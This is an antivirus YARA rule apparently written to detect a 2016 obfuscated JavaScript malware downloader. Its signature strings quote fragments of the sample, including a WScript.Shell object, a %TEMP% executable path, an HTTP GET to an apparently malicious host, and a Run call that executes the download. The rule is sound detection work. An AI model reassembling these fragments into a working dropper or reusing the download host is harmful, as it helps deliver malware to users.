rule sig_20160329_66f6e41935ced4fbf32d95cd9513972a {
  meta:
    description = "datamaliciousorder - file 20160329_66f6e41935ced4fbf32d95cd9513972a.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "2188a4de46e5a373729ab56ae9c3a350ddceb2b5e13e407dc65675ebf73774eb"

  strings:
    $s1  = "function Relbtngkl() {return Nycrha[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"WIsSmitI.exe\";};" fullword ascii
    $s2  = "do {WScript[Xiqcq](Ifzhuhf() * 11)} while (Fcgqhowcfw[\"readystate\"] < 4 );" fullword ascii
    $s3  = "var Nycrha = function Emxhml() {return WScript[Aqhxdrkiu](\"WScript.Shell\");}();" fullword ascii
    $s4  = "Fcgqhowcfw[Xhduil](\"GET\", \"http://chibitesafaris.co.tz/ke7sif\", false);" fullword ascii
    $s5  = "function Lncqx(Ztlvltg, Pwukuixh){return Ztlvltg - Pwukuixh;};" fullword ascii
    $s6  = "function Bnuwigic() {return ((Mkthcmyueh == true) && (Mkthcmyueh == Fggseimk)) ? 1 : Fnnxvpcos;};" fullword ascii
    $s7  = "function Rnnwtsh(Dfqxhbhvap){Nycrha[\"Run\"](Dfqxhbhvap, Fnnxvpcos, Fnnxvpcos);};" fullword ascii
    $s8  = "function Wwoioxbjo(){return Aqhxdrkiu;};" fullword ascii
    $s9  = "function Ifzhuhf(){return 22;};" fullword ascii
    $s10 = "var Wxzcrqd = false;" fullword ascii
    $s11 = "function Wpnrqhkxhb(Hrlljqlf) {var Nrpqngh = (1, 2, 3, 4, 5, Hrlljqlf); return Nrpqngh;};" fullword ascii
    $s12 = "Mkthcmyueh = true; " fullword ascii
    $s13 = "var Mrdeqpzr = new this[\"Date\"]();" fullword ascii
    $s14 = "Fggseimk = true; " fullword ascii
    $s15 = "var Fggseimk = false;" fullword ascii
    $s16 = "function Rntxk(){return Fpqsuslkma;};" fullword ascii
    $s17 = "return Lncqx(Fuhyl, Xpyjdwfirf);" fullword ascii
    $s18 = "var Mkthcmyueh = false;" fullword ascii
    $s19 = "function Hlmjd()" fullword ascii
    $s20 = " while (Tqhxgbhf){" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}